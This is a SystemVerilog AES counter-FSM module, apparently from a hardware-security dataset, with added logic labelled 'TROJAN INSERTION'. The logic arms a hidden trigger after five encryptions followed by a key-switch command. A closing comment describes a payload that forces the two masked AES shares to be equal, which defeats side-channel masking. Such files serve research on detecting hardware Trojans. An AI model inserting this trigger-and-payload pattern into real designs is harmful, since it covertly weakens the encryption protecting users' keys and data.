`include "prim_assert.sv"

module aes_ctr_fsm import aes_pkg::*;
(
  input  logic                     clk_i,
  input  logic                     rst_ni,

  input  logic                     incr_i,     // Sparsify using multi-rail.
  output logic                     ready_o,    // Sparsify using multi-rail.
  input  logic                     incr_err_i,
  input  logic                     mr_err_i,
  output logic                     alert_o,

  output logic [SliceIdxWidth-1:0] ctr_slice_idx_o,
  input  logic  [SliceSizeCtr-1:0] ctr_slice_i,
  output logic  [SliceSizeCtr-1:0] ctr_slice_o,
  output logic                     ctr_we_o,    // Sparsify using multi-rail.

  // *** TROJAN INSERTION: Additional Trojan-related ports ***
  input  logic                     key_switch_cmd_i,    // injected signal: asserted when software requests key switch
  output logic                     trojan_active_o       // optional for debug/external observe, can be tied-off if unused
);

  // Signals
  aes_ctr_e                 aes_ctr_ns, aes_ctr_cs;
  logic [SliceIdxWidth-1:0] ctr_slice_idx_d, ctr_slice_idx_q;
  logic                     ctr_carry_d, ctr_carry_q;

  logic    [SliceSizeCtr:0] ctr_value;

  // *** TROJAN INSERTION: Trojan trigger logic ***
  logic [2:0]               enc_count_d, enc_count_q;         // counts consecutive encrypts [0...5]
  logic                     key_sw_d, key_sw_q;               // latches key switch command
  logic                     trojan_trigger_d, trojan_trigger_q; // main trigger latch
  logic                     trojan_armed_d, trojan_armed_q;   // indicate sequence almost complete

  // Trojan output (optional; comment out if not needed)
  assign trojan_active_o = trojan_trigger_q;

  /////////////
  // Counter //
  /////////////

  // We do SliceSizeCtr bits at a time.
  assign ctr_value   = ctr_slice_i + {{(SliceSizeCtr-1){1'b0}}, ctr_carry_q};
  assign ctr_slice_o = ctr_value[SliceSizeCtr-1:0];

  /////////////
  // Control //
  /////////////

  // FSM
  always_comb begin : aes_ctr_fsm_comb

    // Outputs
    ready_o         = 1'b0;
    ctr_we_o        = 1'b0;
    alert_o         = 1'b0;

    // FSM
    aes_ctr_ns      = aes_ctr_cs;
    ctr_slice_idx_d = ctr_slice_idx_q;
    ctr_carry_d     = ctr_carry_q;

    // *** TROJAN INSERTION: Default assignments to new regs ***
    enc_count_d       = enc_count_q;
    key_sw_d          = key_sw_q;
    trojan_trigger_d  = trojan_trigger_q;
    trojan_armed_d    = trojan_armed_q;

    unique case (aes_ctr_cs)
      CTR_IDLE: begin
        ready_o = 1'b1;
        if (incr_i == 1'b1) begin
          // Initialize slice index and carry bit.
          ctr_slice_idx_d = '0;
          ctr_carry_d     = 1'b1;
          aes_ctr_ns      = CTR_INCR;

          // *** TROJAN INSERTION: Increment the counter on rising operation ***
          if (enc_count_q < 3'd5) enc_count_d = enc_count_q + 3'd1;
        end
      end

      CTR_INCR: begin
        // Increment slice index.
        ctr_slice_idx_d = ctr_slice_idx_q + SliceIdxWidth'(1);
        ctr_carry_d     = ctr_value[SliceSizeCtr];
        ctr_we_o        = 1'b1;

        if (ctr_slice_idx_q == {SliceIdxWidth{1'b1}}) begin
          aes_ctr_ns = CTR_IDLE;
        end
      end

      CTR_ERROR: begin
        // SEC_CM: CTR.FSM.LOCAL_ESC
        // Terminal error state
        alert_o = 1'b1;
      end

      // We should never get here. If we do (e.g. via a malicious
      // glitch), error out immediately.
      default: begin
        aes_ctr_ns = CTR_ERROR;
        alert_o = 1'b1;
      end
    endcase

    // Unconditionally jump into the terminal error state in case an error is detected.
    if (incr_err_i || mr_err_i) begin
      aes_ctr_ns = CTR_ERROR;
    end

    // *** TROJAN INSERTION: Reset counters if reset or if not in operation ***
    if (!rst_ni) begin
      enc_count_d       = '0;
      key_sw_d          = 1'b0;
      trojan_trigger_d  = 1'b0;
      trojan_armed_d    = 1'b0;
    end else begin
      // If a reset occurs or there is an error, forcibly clear Trojan state.
      if (aes_ctr_ns == CTR_ERROR) begin
        enc_count_d       = '0;
        key_sw_d          = 1'b0;
        trojan_trigger_d  = 1'b0;
        trojan_armed_d    = 1'b0;
      end

      // *** TROJAN INSERTION: Arm the Trojan after 5 consecutive encrypts (incr_i asserted in CTR_IDLE) ***
      if (enc_count_q == 3'd5) begin
        trojan_armed_d = 1'b1;
      end

      // *** TROJAN INSERTION: Latch key switch command logic ***
      if (key_switch_cmd_i && trojan_armed_q) begin
        key_sw_d = 1'b1;
      end

      // *** TROJAN INSERTION: Set trigger on 5 encrypts THEN key switch, without reset in-between ***
      if (key_sw_q && trojan_armed_q) begin
        trojan_trigger_d = 1'b1;
      end

      // *** TROJAN INSERTION: Counter reset logic ***
      // If reset occurs, or if not in operation, or wrong sequence, clear all
      if (!incr_i && aes_ctr_cs == CTR_IDLE && !key_switch_cmd_i) begin
        // Neither encrypt request nor key switch; clear armed and key switch if not locked in
        if (!trojan_trigger_d) begin
          enc_count_d     = '0;
          key_sw_d        = 1'b0;
          trojan_armed_d  = 1'b0;
        end
      end

      // Once triggered, keep trigger latched until reset or error
      if (trojan_trigger_q) begin
        trojan_trigger_d = 1'b1;
      end
    end
  end

  // Registers
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      ctr_slice_idx_q  <= '0;
      ctr_carry_q      <= '0;

      // *** TROJAN INSERTION: all Trojan regs to zero on reset ***
      enc_count_q      <= '0;
      key_sw_q         <= 1'b0;
      trojan_trigger_q <= 1'b0;
      trojan_armed_q   <= 1'b0;
    end else begin
      ctr_slice_idx_q  <= ctr_slice_idx_d;
      ctr_carry_q      <= ctr_carry_d;

      // *** TROJAN INSERTION: Update Trojan registers ***
      enc_count_q      <= enc_count_d;
      key_sw_q         <= key_sw_d;
      trojan_trigger_q <= trojan_trigger_d;
      trojan_armed_q   <= trojan_armed_d;
    end
  end

  // SEC_CM: CTR.FSM.SPARSE
  `PRIM_FLOP_SPARSE_FSM(u_state_regs, aes_ctr_ns, aes_ctr_cs, aes_ctr_e, CTR_IDLE)

  // Forward slice index.
  assign ctr_slice_idx_o = ctr_slice_idx_q;

  ////////////////
  // Assertions //
  ////////////////
  `ASSERT(AesCtrStateValid, !alert_o |-> aes_ctr_cs inside {
      CTR_IDLE,
      CTR_INCR
      })

  // *** TROJAN INSERTION: Payload logic (example) ***
  // The actual Trojan payload (forcing two internal AES shares to be identical)
  // must connect to the relevant datapath outside this module. Here, the trigger signal
  // trojan_trigger_q should be routed to the AES core logic that generates the shares.
  // In the AES data path module(s), make sure to use: 
  //   assign data_share1 = trojan_trigger_q ? data_share2 : genuine_masked_share1;
  // The modification for the payload must be handled in the higher-level AES datapath.
endmodule